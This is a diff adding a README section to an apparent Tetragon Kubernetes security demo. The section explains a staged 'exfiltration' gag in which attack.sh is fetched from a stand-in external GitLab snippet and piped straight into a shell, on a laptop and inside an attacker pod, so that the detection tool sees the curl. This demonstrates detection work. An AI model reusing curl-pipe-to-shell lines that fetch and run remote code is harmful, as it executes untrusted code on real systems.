@@ -61,3 +61,51 @@ kubectl exec -n kube-system ds/tetragon -c tetragon -- tetra getevents -o compac
 ```bash
 kubectl delete -f netshoot.yaml
 ```
+
+## The exfiltration gag (`attack.sh`)
+
+The exfil step on the slide is a plain `curl … https://example.com`. `attack.sh`
+is the fun stand-in: the "attack" fetches a payload from **outside** the cluster
+(a GitLab snippet on `gitlab.example.com`), and the payload is a harmless troll —
+theatrical fake exfiltration in the terminal, then it opens a rickroll in the
+browser. Nothing in it reads a real secret or sends real data; every scary line
+is an `echo`, and the only real action is opening a YouTube URL.
+
+**Run it on the laptop (projected)** for the browser rickroll:
+
+```bash
+curl -s https://gitlab.example.com/-/snippets/1/raw/main/attack.sh | bash
+```
+
+Piped into the attacker pod it still prints the theatre on the projected
+terminal, but there is no browser there, so it just prints the link:
+
+```bash
+kubectl exec -n tetragon-demo attacker -- sh -c \
+  'curl -s https://gitlab.example.com/-/snippets/1/raw/main/attack.sh | sh'
+```
+
+Use the laptop form for the payoff. It doubles as a real "fetch to an external
+host" for the exfil beat — Tetragon still sees the `curl` either way.
+
+### Re-creating the snippet
+
+The snippet is not in this repo's CI; it is a GitLab snippet so the demo URL is
+a genuine outside-the-cluster fetch. To (re)create it from `attack.sh`:
+
+- **Web UI:** GitLab → Snippets → New snippet → filename `attack.sh`, paste the
+  file, **Visibility: Public** (so the pod can fetch it with no token), Create.
+  Note the ID and keep the demo URL in sync (`/-/snippets/<ID>/raw/main/attack.sh`).
+- **API (needs a token with `api` scope):**
+
+  ```bash
+  curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
+    --header "Content-Type: application/json" \
+    --data "$(jq -n --arg c "$(cat phase2-container-lab/attack/attack.sh)" \
+      '{title:"attack.sh", file_name:"attack.sh", visibility:"public",
+        content:$c}')" \
+    https://gitlab.example.com/api/v4/snippets
+  ```
+
+Keep `attack.sh` here as the source of truth and push updates to the snippet
+from it, so it is never lost with a cluster again.
